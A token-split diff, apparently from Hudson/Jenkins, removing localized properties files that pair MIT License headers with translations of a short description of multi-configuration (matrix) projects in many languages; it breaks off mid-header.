"uC81D", "\\", "uD2B8", "\\", "uC5D0", "\\", "uC801", "\\", "uD569", "\\", "uD568", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Egner", "seg", "for", "prosjekter", "som", "trenger", "et", "stort", "antall", "forskjellige", "konfigurasjoner", ",", "som", "testing", "i", "forskjellige", "milj", "\\", "u00F8er", ",", "plattformspesifikke", "bygg", "osv", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "sorokh", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Geschikt", "voor", "projecten", "die", "een", "groot", "aantal", "verschillende", "configuraties", "nodig", "hebben", ",", "zoals", "testen", "op", "meerdere", "omgevingen", ",", "platformspecifieke", "bouwpogingen", ",", "etc", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Przeznaczone", "dla", "projekt", "\\", "u00F3w", ",", "kt", "\\", "u00F3re", "potrzebuj", "\\", "u0105", "du", "\\", "u017Cej", "liczby", "r", "\\", "u00F3", "\\", "u017Cnych", "konfiguracji", ",", "np", ".", "testuj", "\\", "u0105cych", "na", "wielu", "\\", "u015Brodowiskach", ",", "buduj", "\\", "u0105cych", "oprogramowanie", "dla", "wybranych", "platform", ",", "itp", ".", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "#", "\\", "#", "Suitable", "for", "projects", "that", "need", "a", "large", "number", "of", "different", "configurations", ",", "\\", "#", "such", "as", "testing", "on", "multiple", "environments", ",", "platform", "-", "specific", "builds", ",", "etc", ".", "body", "=", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Apropriado", "para", "projetos", "que", "necessitam", "de", "grande", "n", "\\", "u00famero", "de", "diferentes", "configura", "\\", "u00e7", "\\", "u00f5es", ",", "como", "teste", "em", "m", "\\", "u00faltiplos", "ambientes", ",", "builds", "para", "plataformas", "espec", "\\", "u00edficas", ",", "etc", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Mike", "Salnikov", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "u041F", "\\", "u043E", "\\", "u0434", "\\", "u0445", "\\", "u043E", "\\", "u0434", "\\", "u0438", "\\", "u0442", "\\", "u0434", "\\", "u043B", "\\", "u044F", "\\", "u043F", "\\", "u0440", "\\", "u043E", "\\", "u0435", "\\", "u043A", "\\", "u0442", "\\", "u043E", "\\", "u0432", ",", "\\", "u0442", "\\", "u0440", "\\", "u0435", "\\", "u0431", "\\", "u0443", "\\", "u044E", "\\", "u0449", "\\", "u0438", "\\", "u0445", "\\", "u0431", "\\", "u043E", "\\", "u043B", "\\", "u044C", "\\", "u0448", "\\", "u043E", "\\", "u0435", "\\", "u043A", "\\", "u043E", "\\", "u043B", "\\", "u0438", "\\", "u0447", "\\", "u0435", "\\", "u0441", "\\", "u0442", "\\", "u0432", "\\", "u043E", "\\", "u0440", "\\", "u0430", "\\", "u0437", "\\", "u043B", "\\", "u0438", "\\", "u0447", "\\", "u043D", "\\", "u044B", "\\", "u0445", "\\", "u043A", "\\", "u043E", "\\", "u043D", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u0439", ",", "\\", "u0442", "\\", "u0430", "\\", "u043A", "\\", "u0438", "\\", "u0445", "\\", "u043A", "\\", "u0430", "\\", "u043A", "\\", "u0442", "\\", "u0435", "\\", "u0441", "\\", "u0442", "\\", "u0438", "\\", "u0440", "\\", "u043E", "\\", "u0432", "\\", "u0430", "\\", "u043D", "\\", "u0438", "\\", "u0435", "\\", "u0432", "\\", "u0440", "\\", "u0430", "\\", "u0437", "\\", "u043D", "\\", "u043E", "\\", "u043E", "\\", "u0431", "\\", "u0440", "\\", "u0430", "\\", "u0437", "\\", "u043D", "\\", "u044B", "\\", "u0445", "\\", "u0441", "\\", "u0440", "\\", "u0435", "\\", "u0434", "\\", "u0430", "\\", "u0445", ",", "\\", "u043F", "\\", "u043B", "\\", "u0430", "\\", "u0442", "\\", "u0444", "\\", "u043E", "\\", "u0440", "\\", "u043C", "\\", "u043E", "\\", "u0437", "\\", "u0430", "\\", "u0432", "\\", "u0438", "\\", "u0441", "\\", "u0438", "\\", "u043C", "\\", "u044B", "\\", "u0435", "\\", "u0441", "\\", "u0431", "\\", "u043E", "\\", "u0440", "\\", "u043A", "\\", "u0438", "\\", "u0438", "\\", "u0442", ".", "\\", "u0434", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "L", "\\", "u00E4mplig", "f", "\\", "u00F6r", "projekt", "som", "beh", "\\", "u00F6ver", "ett", "stort", "antal", "olika", "konfigurationer", ",", "s", "\\", "u00E5som", "testning", "p", "\\", "u00E5", "flera", "milj", "\\", "u00F6er", ",", "plattformsneutrala", "byggen", ",", "etc", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Oguz", "Dag", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Platforma", "\\", "u00d6zg", "\\", "u00fc", "yap", "\\", "u0131land", "\\", "u0131rmalara", "sahip", "veya", "\\", "u00e7e", "\\", "u015fitli", "ortamlarda", "test", "i", "\\", "u015flemi", "yapan", "projeler", "gibi", "\\", "u00e7ok", "fazla", "say", "\\", "u0131da", "konfig", "\\", "u00fcrasyona", "ihtiya", "\\", "u00e7", "duyan", "projeler", "i", "\\", "u00e7in", "uygundur", ".", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "body", "=", "\\", "u041F", "\\", "u0456", "\\", "u0434", "\\", "u0445", "\\", "u043E", "\\", "u0434", "\\", "u0438", "\\", "u0442", "\\", "u044C", "\\", "u0434", "\\", "u043B", "\\", "u044F", "\\", "u043F", "\\", "u0440", "\\", "u043E", "\\", "u0435", "\\", "u043A", "\\", "u0442", "\\", "u0456", "\\", "u0432", ",", "\\", "u044F", "\\", "u043A", "\\", "u0456", "\\", "u043F", "\\", "u043E", "\\", "u0442", "\\", "u0440", "\\", "u0435", "\\", "u0431", "\\", "u0443", "\\", "u044E", "\\", "u0442", "\\", "u044C", "\\", "u0432", "\\", "u0435", "\\", "u043B", "\\", "u0438", "\\", "u043A", "\\", "u0443", "\\", "u043A", "\\", "u0456", "\\", "u043B", "\\", "u044C", "\\", "u043A", "\\", "u0456", "\\", "u0441", "\\", "u0442", "\\", "u044C", "\\", "u0440", "\\", "u0456", "\\", "u0437", "\\", "u043D", "\\", "u043E", "\\", "u043C", "\\", "u0430", "\\", "u043D", "\\", "u0456", "\\", "u0442", "\\", "u043D", "\\", "u0438", "\\", "u0445", "\\", "u043A", "\\", "u043E", "\\", "u043D", "\\", "u0444", "\\", "u0456", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0456", "\\", "u0439", ",", "\\", "u0442", "\\", "u0430", "\\", "u043A", "\\", "u0438", "\\", "u0445", "\\", "u044F", "\\", "u043A", "\\", "u0442", "\\", "u0435", "\\", "u0441", "\\", "u0442", "\\", "u0443", "\\", "u0432", "\\", "u0430", "\\", "u043D", "\\", "u043D", "\\", "u044F", "\\", "u0443", "\\", "u0440", "\\", "u0456", "\\", "u0437", "\\", "u043D", "\\", "u0438", "\\", "u0445", "\\", "u0441", "\\", "u0435", "\\", "u0440", "\\", "u0435", "\\", "u0434", "\\", "u043E", "\\", "u0432", "\\", "u0438", "\\", "u0449", "\\", "u0430", "\\", "u0445", ",", "\\", "u043F", "\\", "u043B", "\\", "u0430", "\\", "u0442", "\\", "u0444", "\\", "u043E", "\\", "u0440", "\\", "u043C", "\\", "u043E", "\\", "u0437", "\\", "u0430", "\\", "u043B", "\\", "u0435", "\\", "u0436", "\\", "u043D", "\\", "u0456", "\\", "u0437", "\\", "u0431", "\\", "u0456", "\\", "u0440", "\\", "u043A", "\\", "u0438", "\\", "u0442", "\\", "u0430", "\\", "u0456", "\\", "u043D", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "u9002", "\\", "u7528", "\\", "u4e8e", "\\", "u591a", "\\", "u914d", "\\", "u7f6e", "\\", "u9879", "\\", "u76ee", ",", "\\", "u4f8b", "\\", "u5982", "\\", "u591a", "\\", "u73af", "\\", "u5883", "\\", "u6d4b", "\\", "u8bd5", ",", "\\", "u5e73", "\\", "u53f0", "\\", "u6307", "\\", "u5b9a", "\\", "u6784", "\\", "u5efa", ",", "\\", "u7b49", "\\", "u7b49", ".", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2013", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "#", "and", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "u9069", "\\", "u5408", "\\", "u9700", "\\", "u8981", "\\", "u6709", "\\", "u5927", "\\", "u91cf", "\\", "u4e0d", "\\", "u540c", "\\", "u8a2d", "\\", "u5b9a", "\\", "u7684", "\\", "u5c08", "\\", "u6848", "\\", "uff0c", "\\", "u4f8b", "\\", "u5982", "\\", "u5728", "\\", "u5404", "\\", "u5f0f", "\\", "u74b0", "\\", "u5883", "\\", "u4e0a", "\\", "u9032", "\\", "u884c", "\\", "u6e2c", "\\", "u8a66", "\\", "u3001", "\\", "u5e73", "\\", "u53f0", "\\", "u76f8", "\\", "u4f9d", "\\", "u7684", "\\", "u5efa", "\\", "u7f6e", ".", "..", "\\", "u7b49", "\\", "u4f5c", "\\", "u696d", "\\", "u3002", "@", "@", "-", "1", ",", "41", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", 